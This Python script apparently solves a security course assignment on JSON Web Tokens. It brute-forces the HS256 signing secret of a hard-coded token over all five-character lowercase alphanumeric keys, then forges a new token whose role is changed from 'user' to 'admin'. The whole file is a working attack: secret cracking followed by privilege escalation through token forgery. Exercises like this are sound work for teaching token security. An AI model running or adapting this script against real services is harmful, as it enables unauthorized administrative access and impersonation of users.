import base64
import hmac
import hashlib
import itertools
import string
import json

def base64url_decode(data: str) -> bytes:
    """
    Decode a Base64URL-encoded string by adding padding if necessary.
    """
    data = data.replace('-', '+').replace('_', '/')
    padding_needed = len(data) % 4
    if padding_needed:
        data += '=' * (4 - padding_needed)  # Add padding
    return base64.b64decode(data)

def base64url_encode(data: bytes) -> str:
    """
    Encode bytes into Base64URL format (without padding).
    """
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def jwt_signature(token: str) -> tuple[str, str, str]:
    """
    Split the JWT token into header, payload, and signature.
    """
    header, payload, signature = token.split('.')
    return header, payload, signature

def generate_hmac_signature(header: str, payload: str, key: str) -> str:
    """
    Generate HMAC-SHA256 signature with the given key.
    """
    message = f"{header}.{payload}".encode()
    secret = key.encode()
    signature = hmac.new(secret, message, hashlib.sha256).digest()
    return base64url_encode(signature)  # Base64URL encode the result

def brute_force_jwt(token: str, wordlist):
    """
    Try different keys to brute-force the JWT signature.
    """
    header, payload, signature = jwt_signature(token)
    print(f"Header: {header}")
    print(f"Payload: {payload}")
    print(f"Signature: {signature}")

    for key in wordlist:
        computed_signature = generate_hmac_signature(header, payload, key)
        print(f"Trying key: {key}")
        if computed_signature == signature:
            print(f"✅ Found secret key: {key}")
            return key  # Stop after finding the key

    print("❌ Secret key not found.")
    return None

def create_modified_jwt(secret: str):
    """
    Create a new JWT with role changed to admin.
    """
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {
        "sub": "fcs-assignment-1",
        "iat": 1516239022,
        "exp": 1672511400,
        "role": "admin",
        "email": "arun@iiitd.ac.in",
        "hint": "lowercase-alphanumeric-length-5"
    }

    header = base64url_encode(json.dumps(header).encode())
    payload = base64url_encode(json.dumps(payload).encode())
    signature = generate_hmac_signature(header, payload, secret)

    return f"{header}.{payload}.{signature}"


if __name__ == "__main__":
    # JWT Token
    token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJmY3MtYXNzaWdubWVudC0xIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE2NzI1MTE0MDAsInJvbGUiOiJ1c2VyIiwiZW1haWwiOiJhcnVuQGlpaXRkLmFjLmluIiwiaGludCI6Imxvd2VyY2FzZS1hbHBoYW51bWVyaWMtbGVuZ3RoLTUifQ.LCIyPHqWAVNLT8BMXw8_69TPkvabp57ZELxpzom8FiI"

    # Generate wordlist: All 5-character lowercase alphanumeric combinations
    chars = string.ascii_lowercase + string.digits  # "abcdefghijklmnopqrstuvwxyz0123456789"
    wordlist = (''.join(p) for p in itertools.product(chars, repeat=5))  # Generator to save memory
    print(wordlist)

    # Start brute force attack
    secret_key = brute_force_jwt(token, wordlist)
    if secret_key:
        modified_jwt = create_modified_jwt(secret_key)
        print(f"Modified JWT: {modified_jwt}")
    else:
        print("Cannot create modified JWT without the secret key.")
